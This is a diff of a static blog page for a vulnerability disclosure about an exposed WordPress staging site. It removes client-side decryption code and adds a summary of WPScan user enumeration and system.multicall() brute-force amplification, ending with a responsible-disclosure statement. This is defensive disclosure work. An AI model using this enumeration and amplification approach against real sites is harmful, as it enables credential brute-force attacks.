0xK8G2wqSotbI0JBdmOxmClFfSd071JMI/ViBq3EyiR37ewcTn+ACv666/zIUn/yVkyUsYAbw6VLHj6B6mtR7EyW13ScSu7/ITind0WvUQR9bP6JfVlF7r9z7hcz/R1o2072rfxCFXOJonjlky4WH6A3DJvj76JLorps6dQqfGcGfxS16Rzgp2lDAUGz17NLli1zaTTmFBOUjeeAn/HAsnC0ODunGqZtj2jmjZxFv0wX+Q2S4//uizvvYTZCsIV89DnqFVAfNAOxz1ZNnZz4GFl3UBmoy3CCEWyW/Gko77HlFZddF0/nFTOXq5gzIwizutWSiL5T4KSsJ5xZ77maIHpco+AYSrq/9WbLTvBbOQTJfZ4Q9+xIyOrsKqM7iTMR8urtU8TJk7yQZOkxDj8NFSPN/nzA5I0DhM0Lhpw6pnxZMU/P4X3ix2if1zb7vhBuBOKKKLh7ZYYpUTWOI2sUu9+4xWJxmZboF9v19IArJXPTngk9HB7Th+BSWUPK43sIVid0WMHfq2BIPV9ylYhnKzvphjfZKl4rDjvSFVI6ursjPE2MAS0bf6k89w3EI7jra5NzYoyNnnoEA3bnFc3MaBlfNEronU9M1ulMB0x3u+M5J8V+nsfry6MGCcLM6CkpL85dxb8nhPal3QxY4VqNal/G29MRkulwQ6wMBiV7zSEhZS2O9Z8gUvM4o4CDo0Q9PtbGRgiNQFR4b19liksYyc7jF661HlIGQREUJJktwd0H0S9DeR4jJr6e2T2l/cnA03KI18siRpUMCQ/j8jQ2CMyWpVMAd8QlBe2Jkwvi1l/auTgVDMgA48S4gA9RzOUzN3xgimv8tW0zgosersTbg8NJ8uCEHsekzYQUjeds4l+Fy0UQ7SrnDOB0F/lxYFJicGrT5sYaSwKJ5T44o2YNGOgHw3cAZzFO1V5imncwm0YACuW/L9e7rEIxFSrtfqpk8FQ73VT4ARsZGsu7hjmev+clLYTICY3SxE6MZBQAIilXpEH1fTr+X1NMeh0cdkBmbEeCgMYlUo9+tB1Z0pSaSCxGOHjOjY9jlE7eX7jINTMj3CQpdK0VvlES3472c/TxhZ4yL+HNgoKU2rghUpzYyGB/OGAtPFaO1pVecmDOuvyRPEYb/44dOA1vm8ZTfZVKAhP7gUDvqtLLDBuo1Swi13xkkC1yD8kxkVOuNaaYmCQsEUDqPkzhMnEDDtaR75vU1bjo4E9XcBL7D2jMDcHQxhR7JOPVIJe4rfwPIk7dhqw8/G7yEzeEKp8uyLS08YP9E9SnsiNsXYLkdyuFeMeJTAcH+QeD+aK8vY0DRoFDNcwRj42G6cTvl4mLtCgzlI/hKejt0RQiRZntkqtjJ2es2TCheVWJq0/e291v6dSQK3jP7OJTCAm9owmqaicJ4vTBsaN/8xSVyBwxuoS9lN55A8OsDRdsd3A0zcXu5pxMD4zEKuQ+mpF4eyjGyAOzOXdO2TkZOs9b+TYqpMs7BTAQygXzW7PGcrcTp1iE2F4fVOlJnkTK3f1Sk9eihG1jYs6GuGWIF8Ta8hT5Ci7b56ciEgp4Y="};
-
-async function pbkdf2(password, salt, iterations, keyLength) {
-  const encoder = new TextEncoder();
-  const passwordBuffer = encoder.encode(password);
-  const saltBuffer = Uint8Array.from(atob(salt), c => c.charCodeAt(0));
-
-  const keyMaterial = await crypto.subtle.importKey(
-    'raw',
-    passwordBuffer,
-    { name: 'PBKDF2' },
-    false,
-    ['deriveBits']
-  );
-
-  const derivedBits = await crypto.subtle.deriveBits(
-    {
-      name: 'PBKDF2',
-      salt: saltBuffer,
-      iterations: iterations,
-      hash: 'SHA-256'
-    },
-    keyMaterial,
-    keyLength * 8
-  );
-
-  return new Uint8Array(derivedBits);
-}
-
-function hideTableOfContents() {
-  // Hide all TOC containers on page load
-  const tocContainers = document.querySelectorAll('#toc, #toc-footer, .toc-container');
-  tocContainers.forEach(toc => {
-    toc.style.display = 'none';
-  });
-}
-
-function regenerateTableOfContents() {
-  // Find TOC elements - look for the ol.toc elements specifically
-  const tocSelectors = [
-    '#toc ol',           // Cactus main TOC
-    '#toc-footer ol',    // Cactus footer TOC
-    '.toc',              // Generic TOC
-    '.post-toc',
-    '.article-toc',
-    '.table-of-contents',
-    '.toc-content'
-  ];
-
-  const tocElements = [];
-  tocSelectors.forEach(selector => {
-    const elements = document.querySelectorAll(selector);
-    elements.forEach(el => {
-      if (!tocElements.includes(el)) {
-        tocElements.push(el);
-      }
-    });
-  });
-
-  if (tocElements.length === 0) return; // No TOC found
-
-  // Use the SAME selector order as decryption to ensure we find the same container
-  const articleContainer = document.querySelector('.content.e-content') ||
-                          document.querySelector('.content') ||
-                          document.querySelector('.article-entry') ||
-                          document.querySelector('.post-content');
-
-  if (!articleContainer) return;
-
-  // Get only H2-H6 headings (exclude H1 which is typically the article title)
-  const headings = Array.from(articleContainer.querySelectorAll('h2, h3, h4, h5, h6'));
-
-  if (headings.length === 0) {
-    // No headings, hide TOC
-    tocElements.forEach(toc => toc.style.display = 'none');
-    return;
-  }
-
-  // Detect the theme style by checking existing structure
-  const firstTocElement = tocElements[0];
-  const isCactusTheme = firstTocElement.classList.contains('toc') &&
-                        firstTocElement.tagName === 'OL';
-
-  // Generate new TOC HTML based on theme
-  let tocHTML = '';
-  let tocNumbers = [];
-
-  if (isCactusTheme) {
-    // Use Cactus theme structure
-    tocHTML = generateCactusTOC(headings);
-  } else {
-    // Use generic structure
-    tocHTML = generateGenericTOC(headings);
-  }
-
-  // Update all TOC elements and show their containers
-  tocElements.forEach(tocElement => {
-    tocElement.innerHTML = tocHTML;
-    tocElement.style.display = '';
-  });
-
-  // Show TOC containers
-  const tocContainers = document.querySelectorAll('#toc, #toc-footer, .toc-container');
-  tocContainers.forEach(toc => {
-    toc.style.display = '';
-  });
-}
-
-function generateCactusTOC(headings) {
-  let tocHTML = '';
-  let numbers = [0, 0, 0, 0, 0, 0]; // Track numbering for each level
-  let currentLevel = 0;
-  let minLevel = Math.min(...headings.map(h => parseInt(h.tagName.charAt(1))));
-
-  headings.forEach((heading, index) => {
-    const level = parseInt(heading.tagName.charAt(1));
-    const text = heading.textContent;
-    const id = heading.id || 'heading-' + index;
-
-    // Ensure heading has an ID for linking
-    if (!heading.id) {
-      heading.id = id;
-    }
-
-    // Update numbering
-    numbers[level - 1]++;
-    // Reset deeper level numbers
-    for (let i = level; i < 6; i++) {
-      numbers[i] = 0;
-    }
-
-    // Generate number string starting from minLevel
-    let numberStr = '';
-    for (let i = minLevel - 1; i < level; i++) {
-      if (numbers[i] > 0) {
-        numberStr += (numberStr ? '.' : '') + numbers[i];
-      }
-    }
-    numberStr += '.';
-
-    // Handle nesting - only nest if deeper than minLevel
-    const relativeLevel = level - minLevel + 1;
-    const relativeCurrentLevel = currentLevel - minLevel + 1;
-
-    if (relativeLevel > relativeCurrentLevel && relativeCurrentLevel > 0) {
-      tocHTML += '<ol class="toc-child">';
-    } else if (relativeLevel < relativeCurrentLevel) {
-      for (let i = relativeCurrentLevel; i > relativeLevel; i--) {
-        tocHTML += '</ol></li>';
-      }
-    }
-
-    if (relativeCurrentLevel > 0 && relativeLevel === relativeCurrentLevel) {
-      tocHTML += '</li>';
-    }
-
-    tocHTML += '<li class="toc-item toc-level-' + level + '">' +
-               '<a class="toc-link" href="#' + id + '">' +
-               '<span class="toc-number">' + numberStr + '</span> ' +
-               '<span class="toc-text">' + text + '</span>' +
-               '</a>';
-
-    currentLevel = level;
-  });
-
-  // Close any remaining open tags
-  const relativeCurrentLevel = currentLevel - minLevel + 1;
-  tocHTML += '</li>';
-  for (let i = 1; i < relativeCurrentLevel; i++) {
-    tocHTML += '</ol></li>';
-  }
-
-  return tocHTML;
-}
-
-function generateGenericTOC(headings) {
-  let tocHTML = '';
-  let currentLevel = 0;
-
-  headings.forEach((heading, index) => {
-    const level = parseInt(heading.tagName.charAt(1));
-    const text = heading.textContent;
-    const id = heading.id || 'heading-' + index;
-
-    // Ensure heading has an ID for linking
-    if (!heading.id) {
-      heading.id = id;
-    }
-
-    if (level > currentLevel) {
-      tocHTML += '<ul>'.repeat(level - currentLevel);
-    } else if (level < currentLevel) {
-      tocHTML += '</ul>'.repeat(currentLevel - level);
-    }
-
-    tocHTML += '<li><a href="#' + id + '">' + text + '</a></li>';
-    currentLevel = level;
-  });
-
-  tocHTML += '</ul>'.repeat(currentLevel);
-  return tocHTML;
-}
-
-async function decryptContent() {
-  const password = document.getElementById('password-input').value;
-  const errorDiv = document.getElementById('error-message');
-
-  if (!password) {
-    errorDiv.textContent = 'Please enter a password.';
-    errorDiv.style.display = 'block';
-    return;
-  }
-
-  try {
-    errorDiv.style.display = 'none';
-
-    const key = await pbkdf2(password, encryptedData.salt, 10000, 32);
-    const iv = Uint8Array.from(atob(encryptedData.iv), c => c.charCodeAt(0));
-    const authTag = Uint8Array.from(atob(encryptedData.authTag), c => c.charCodeAt(0));
-    const encrypted = Uint8Array.from(atob(encryptedData.encrypted), c => c.charCodeAt(0));
-
-    const cryptoKey = await crypto.subtle.importKey(
-      'raw',
-      key,
-      { name: 'AES-GCM' },
-      false,
-      ['decrypt']
-    );
-
-    const encryptedWithTag = new Uint8Array(encrypted.length + authTag.length);
-    encryptedWithTag.set(encrypted);
-    encryptedWithTag.set(authTag, encrypted.length);
-
-    const decrypted = await crypto.subtle.decrypt(
-      {
-        name: 'AES-GCM',
-        iv: iv,
-        tagLength: 128
-      },
-      cryptoKey,
-      encryptedWithTag
-    );
-
-    const content = new TextDecoder().decode(decrypted);
-
-    const contentContainer = document.querySelector('.content.e-content') ||
-                            document.querySelector('.content') ||
-                            document.querySelector('.article-entry') ||
-                            document.querySelector('.post-content');
-
-    if (contentContainer) {
-      contentContainer.innerHTML = content;
-    } else {
-      const passwordContainer = document.getElementById('password-protected-content');
-      passwordContainer.outerHTML = content;
-    }
-
-    // Wait for DOM to update before regenerating TOC
-    setTimeout(() => regenerateTableOfContents(), 0);
-
-  } catch (error) {
-    errorDiv.textContent = 'Incorrect password. Please try again.';
-    errorDiv.style.display = 'block';
-  }
-}
-
-document.getElementById('password-input').addEventListener('keypress', function(e) {
-  if (e.key === 'Enter') {
-    decryptContent();
-  }
-});
-
-// Hide ToC on page load when password form is present
-hideTableOfContents();
-</script>
+<p>WPScan results confirmed:</p>
+<ul>
+<li>four distinct user accounts were enumerated</li>
+<li>xml-rpc functionality was verified as enabled (should have just done this from the start, in retrospect)</li>
+<li>multiple enumeration vectors were available (RSS feeds, JSON API, Author sitemaps)</li>
+</ul>
+<p>when combined with the <code>system.multicall()</code> amplification capability, this configuration presents a significant security risk for credential brute-force attacks.</p>
+<h2 id="disclosure"><a href="#disclosure" class="headerlink" title="disclosure"></a>disclosure</h2><p>This vulnerability was responsibly disclosed to the affected organization and has been remediated. Public disclosure was authorized following the resolution of all identified security issues.</p>
 
   </div>
 </article>
@@ -551,23 +245,23 @@ hideTableOfContents();
     
     
       <div id="toc-footer" style="display: none">
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#password-form-container"><span class="toc-number">1.</span> <span class="toc-text">WordPress XML-RPC Vulnerability Disclosure: Exposed Staging Environment</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#initial-recon-user-enum"><span class="toc-number">1.</span> <span class="toc-text">initial recon + user enum</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#port-scan-discovery"><span class="toc-number">2.</span> <span class="toc-text">port scan + discovery</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#subdomain-enumeration-and-Discovery"><span class="toc-number">3.</span> <span class="toc-text">subdomain enumeration and Discovery</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#poking-around-staging-branch"><span class="toc-number">4.</span> <span class="toc-text">poking around staging branch</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xml-rpc-security-implications"><span class="toc-number">5.</span> <span class="toc-text">xml-rpc security implications</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#system-multicall-Attack-Vector"><span class="toc-number">5.1.</span> <span class="toc-text">system.multicall() Attack Vector</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#proof-of-concept"><span class="toc-number">5.2.</span> <span class="toc-text">proof of concept</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#additional-User-Enumeration-via-WPScan"><span class="toc-number">6.</span> <span class="toc-text">additional User Enumeration via WPScan</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#disclosure"><span class="toc-number">7.</span> <span class="toc-text">disclosure</span></a></li></ol>
       </div>
     
 
     <div id="share-footer" style="display: none">
       <ul>
   <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://rivers.sh/posts/xmlrpc/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://rivers.sh/posts/xmlrpc/&text=WordPress XML-RPC Vulnerability Disclosure: Exposed Staging Environment"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://rivers.sh/posts/xmlrpc/&title=WordPress XML-RPC Vulnerability Disclosure: Exposed Staging Environment"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://rivers.sh/posts/xmlrpc/&is_video=false&description=WordPress XML-RPC Vulnerability Disclosure: Exposed Staging Environment"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=WordPress XML-RPC Vulnerability Disclosure: Exposed Staging Environment&body=Check out this article: https://rivers.sh/posts/xmlrpc/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://rivers.sh/posts/xmlrpc/&title=WordPress XML-RPC Vulnerability Disclosure: Exposed Staging Environment"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://rivers.sh/posts/xmlrpc/&title=WordPress XML-RPC Vulnerability Disclosure: Exposed Staging Environment"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://rivers.sh/posts/xmlrpc/&title=WordPress XML-RPC Vulnerability Disclosure: Exposed Staging Environment"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://rivers.sh/posts/xmlrpc/&title=WordPress XML-RPC Vulnerability Disclosure: Exposed Staging Environment"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://rivers.sh/posts/xmlrpc/&name=WordPress XML-RPC Vulnerability Disclosure: Exposed Staging Environment&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://rivers.sh/posts/xmlrpc/&t=WordPress XML-RPC Vulnerability Disclosure: Exposed Staging Environment"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://rivers.sh/posts/xmlrpc/&text=wordPress xml-rpc vulnerability on a gov&#39;t contractor"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://rivers.sh/posts/xmlrpc/&title=wordPress xml-rpc vulnerability on a gov&#39;t contractor"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://rivers.sh/posts/xmlrpc/&is_video=false&description=wordPress xml-rpc vulnerability on a gov&#39;t contractor"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=wordPress xml-rpc vulnerability on a gov&#39;t contractor&body=Check out this article: https://rivers.sh/posts/xmlrpc/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://rivers.sh/posts/xmlrpc/&title=wordPress xml-rpc vulnerability on a gov&#39;t contractor"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://rivers.sh/posts/xmlrpc/&title=wordPress xml-rpc vulnerability on a gov&#39;t contractor"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://rivers.sh/posts/xmlrpc/&title=wordPress xml-rpc vulnerability on a gov&#39;t contractor"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://rivers.sh/posts/xmlrpc/&title=wordPress xml-rpc vulnerability on a gov&#39;t contractor"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://rivers.sh/posts/xmlrpc/&name=wordPress xml-rpc vulnerability on a gov&#39;t contractor&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://rivers.sh/posts/xmlrpc/&t=wordPress xml-rpc vulnerability on a gov&#39;t contractor"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
